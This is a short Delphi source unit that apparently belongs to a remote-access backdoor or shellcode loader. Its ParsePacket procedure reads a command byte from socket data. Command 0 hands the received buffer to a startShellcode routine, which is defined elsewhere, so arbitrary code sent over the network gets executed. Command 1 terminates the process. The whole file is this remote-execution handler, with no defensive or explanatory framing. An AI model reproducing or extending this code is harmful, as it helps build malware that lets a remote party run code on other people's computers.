unit untParser;

interface
uses
  Windows,
  untUtils,
  Winsock;

procedure ParsePacket(mSocket:Integer; mBuff:PWideChar; dwLen:Integer; bCMD:Byte);

implementation

procedure ParsePacket(mSocket:Integer; mBuff:PWideChar; dwLen:Integer; bCMD:Byte);
begin
  case bCMD of
    $0:startShellcode(mBuff, dwLen);
    $1:ExitProcess(0);
  end;
end;
end.
